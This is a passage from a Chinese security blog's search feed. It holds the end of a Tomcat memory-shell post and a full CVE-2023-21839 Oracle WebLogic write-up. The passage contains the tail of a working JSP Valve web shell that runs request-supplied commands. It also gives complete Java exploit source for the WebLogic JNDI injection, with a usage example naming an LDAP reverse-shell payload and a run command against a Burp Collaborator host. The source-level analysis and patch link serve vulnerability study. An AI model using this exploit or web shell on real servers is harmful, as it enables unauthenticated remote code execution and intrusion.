class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>; &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        standardContext.getPipeline().addValve(valve);</span><br><span class="line"></span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/bitterzzZZ/MemoryShellLearn">https://github.com/bitterzzZZ/MemoryShellLearn</a></li>
<li><a href="https://xz.aliyun.com/t/10362">Tomcat 内存马（二）Filter型</a></li>
<li><a href="https://www.cnblogs.com/haimishasha/p/10740606.html">Tomcat系列(4)——Tomcat 组件及架构详细部分</a></li>
<li><a href="https://xuanjian1992.top/2019/08/13/Spring-MVC%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90(xml%E9%85%8D%E7%BD%AE)/">Spring MVC启动流程分析(xml配置)</a></li>
<li><a href="https://blog.csdn.net/hao134838/article/details/109746151">从源码分析tomcat如何调用Servlet的初始化</a></li>
<li><a href="https://www.cnblogs.com/xyylll/p/15463635.html">tomcat内存马原理解析及实现</a></li>
<li><a href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-21839漏洞分析</title>
    <url>/2023/03/18/CVE-2023-21839%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>CVE-2023-21839漏洞分析</p>
</blockquote>
<span id="more"></span>

<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Easily exploitable vulnerability allows unauthenticated attacker with network access via T3, IIOP to compromise Oracle WebLogic Server.</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Weblogic 12.2.1.3.0</li>
<li>Weblogic 12.2.1.4.0</li>
<li>Weblogic 14.1.1.0.0</li>
</ul>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>docker-compose.yml</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:12.2.1.3-2018</span></span><br><span class="line">   <span class="attr">environment:</span></span><br><span class="line">       <span class="attr">debugFlag:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
<p>工具来源：<a href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">https://github.com/DXask88MA/Weblogic-CVE-2023-21839</a></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOW_TO_USE</span> <span class="operator">=</span> <span class="string">&quot;[*]java -jar 目标ip:端口 ldap地址\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(HOW_TO_USE);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;t3://&quot;</span> + t3Url);</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">        weblogic.deployment.jms.<span class="type">ForeignOpaqueReference</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">weblogic</span>.deployment.jms.ForeignOpaqueReference();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">jndiEnvironment</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(</span><br><span class="line">                <span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">        jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        jndiEnvironment.set(f, env);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">remoteJNDIName</span> <span class="operator">=</span> weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField(</span><br><span class="line">                <span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">        remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        remoteJNDIName.set(f, ldapUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis()).nextLong() +</span><br><span class="line">            <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c.bind(bindName, f);</span><br><span class="line">            c.lookup(bindName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar .\Weblogic-CVE-<span class="number">2023</span>-<span class="number">21839</span>.jar <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7001</span> ldap://oe6t0iq10f9wm7yloqgjc8sdq4wukj.burpcollaborator.<span class="built_in">net</span>/dns.log</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202303191013905.png" alt="image-20230318155046319"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当客户端在T3协议中调用<code>bind()</code>和<code>lookup()</code>函数时，服务端允许用户自定义<code>jndiEnvironment</code>和<code>remoteJNDIName</code>，相当于一个二次JNDI注入。</p>
<p>跟进<code>weblogic/jndi/internal/BasicNamingNode.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.jndi.internal;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicNamingNode</span> <span class="keyword">implements</span> <span class="title class_">NamingNode</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">protected</span> Object <span class="title function_">resolveObject</span><span class="params">(String name, Object obj, <span class="type">int</span> mode, Hashtable env)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resolved</span> <span class="operator">=</span> obj;</span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> NamingNode) &#123;</span><br><span class="line">                    resolved = ((NamingNode)obj).getContext(env);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode != <span class="number">0</span> &amp;&amp; mode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    resolved = WLNamingManager.getObjectInstance(obj, <span class="keyword">new</span> <span class="title class_">CompositeName</span>(name), (Context)<span class="literal">null</span>, env); <span class="comment">// 调用getObjectInstance解析name</span></span><br><span class="line">                    resolved = <span class="built_in">this</span>.makeTransportable(resolved, name, env);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br></pre></td></tr></table></figure>

<p>跟进<code>weblogic/jndi/internal/WLNamingManager.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.jndi.internal;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">WLNamingManager</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object boundObject, Name name, Context ctx, Hashtable env)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (boundObject <span class="keyword">instanceof</span> ClassTypeOpaqueReference) &#123;</span><br><span class="line">            <span class="type">Hashtable</span> <span class="variable">jndiEnv</span> <span class="operator">=</span> ThreadLocalMap.get();</span><br><span class="line">            <span class="keyword">if</span> (jndiEnv != <span class="literal">null</span> &amp;&amp; Boolean.parseBoolean((String)jndiEnv.get(<span class="string">&quot;weblogic.jndi.onlyGetClassType&quot;</span>))) &#123;</span><br><span class="line">                boundObject = ((ClassTypeOpaqueReference)boundObject).getObjectClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (boundObject <span class="keyword">instanceof</span> OpaqueReference) &#123;</span><br><span class="line">            boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx); <span class="comment">//当boundObject为OpaqueReference类时，会调用getReferent()解析，其中ForeignOpaqueReference类继承自OpaqueReference类</span></span><br><span class="line">        &#125;</span><br><span class="line">    	...</span><br></pre></td></tr></table></figure>

<p>跟进<code>weblogic/deployment/jms/ForeignOpaqueReference.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.deployment.jms;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForeignOpaqueReference</span> <span class="keyword">implements</span> <span class="title class_">ForeignOpaqueTag</span>, OpaqueReference, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getReferent</span><span class="params">(Name name, Context ctx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">AbstractSubject</span> <span class="variable">originalSubject</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getCurrentSubject(KERNEL_ID);</span><br><span class="line">        InitialContext context;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.jndiEnvironment == <span class="literal">null</span>) &#123; <span class="comment">// 自定义jndiEnvironment</span></span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.jndiEnvironment.get(<span class="string">&quot;java.naming.factory.initial&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.jndiEnvironment.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            context = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(<span class="built_in">this</span>.jndiEnvironment);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        Object retVal;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.jndiEnvironment == <span class="literal">null</span> || !AQJMS_ICF.equals(<span class="built_in">this</span>.jndiEnvironment.get(<span class="string">&quot;java.naming.factory.initial&quot;</span>)) || <span class="built_in">this</span>.remoteJNDIName == <span class="literal">null</span> || !<span class="built_in">this</span>.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !<span class="built_in">this</span>.remoteJNDIName.startsWith(AQJMS_TPREFIX)) &#123;</span><br><span class="line">                retVal = context.lookup(evalMacros(<span class="built_in">this</span>.remoteJNDIName)); <span class="comment">// 自定义remoteJNDIName实现JNDI注入</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.cachedReferent == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.cachedReferent = context.lookup(evalMacros(<span class="built_in">this</span>.remoteJNDIName));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                retVal = <span class="built_in">this</span>.cachedReferent;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            SubjectManager.getSubjectManager().popSubject(KERNEL_ID);</span><br><span class="line">            context.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用栈如下所示：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">getReferent:254, <span class="title">ForeignOpaqueReference</span> (<span class="title">weblogic.deployment.jms</span>)</span></span><br><span class="line"><span class="function"><span class="title">getObjectInstance</span>:106, <span class="title">WLNamingManager</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">resolveObject</span>:1037, <span class="title">BasicNamingNode</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">resolveObject</span>:1009, <span class="title">BasicNamingNode</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">lookup</span>:223, <span class="title">BasicNamingNode</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">lookup</span>:527, <span class="title">ServerNamingNode</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">lookup</span>:84, <span class="title">RootNamingNode</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">invoke</span>:-1, <span class="title">RootNamingNode_WLSkel</span> (<span class="title">weblogic.jndi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">invoke</span>:645, <span class="title">BasicServerRef</span> (<span class="title">weblogic.rmi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">invoke</span>:246, <span class="title">ClusterableServerRef</span> (<span class="title">weblogic.rmi.cluster</span>)</span></span><br><span class="line"><span class="function"><span class="title">run</span>:534, <span class="title">BasicServerRef</span>$2 (<span class="title">weblogic.rmi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">doAs</span>:368, <span class="title">AuthenticatedSubject</span> (<span class="title">weblogic.security.acl.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">runAs</span>:163, <span class="title">SecurityManager</span> (<span class="title">weblogic.security.service</span>)</span></span><br><span class="line"><span class="function"><span class="title">handleRequest</span>:531, <span class="title">BasicServerRef</span> (<span class="title">weblogic.rmi.internal</span>)</span></span><br><span class="line"><span class="function"><span class="title">run</span>:138, <span class="title">WLSExecuteRequest</span> (<span class="title">weblogic.rmi.internal.wls</span>)</span></span><br><span class="line"><span class="function"><span class="title">_runAs</span>:352, <span class="title">ComponentInvocationContextManager</span> (<span class="title">weblogic.invocation</span>)</span></span><br><span class="line"><span class="function"><span class="title">runAs</span>:337, <span class="title">ComponentInvocationContextManager</span> (<span class="title">weblogic.invocation</span>)</span></span><br><span class="line"><span class="function"><span class="title">doRunWorkUnderContext</span>:57, <span class="title">LivePartitionUtility</span> (<span class="title">weblogic.work</span>)</span></span><br><span class="line"><span class="function"><span class="title">runWorkUnderContext</span>:41, <span class="title">PartitionUtility</span> (<span class="title">weblogic.work</span>)</span></span><br><span class="line"><span class="function"><span class="title">runWorkUnderContext</span>:644, <span class="title">SelfTuningWorkManagerImpl</span> (<span class="title">weblogic.work</span>)</span></span><br><span class="line"><span class="function"><span class="title">execute</span>:415, <span class="title">ExecuteThread</span> (<span class="title">weblogic.work</span>)</span></span><br><span class="line"><span class="function"><span class="title">run</span>:355, <span class="title">ExecuteThread</span> (<span class="title">weblogic.work</span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>厂商已发布了漏洞修复补丁：</p>
<p><a href="https://support.oracle.com/rs?type=doc&id=2917213.2">https://support.oracle.com/rs?type=doc&amp;id=2917213.2</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://xz.aliyun.com/t/12263">Weblogic远程代码执行漏洞CVE-2023-21839复现</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
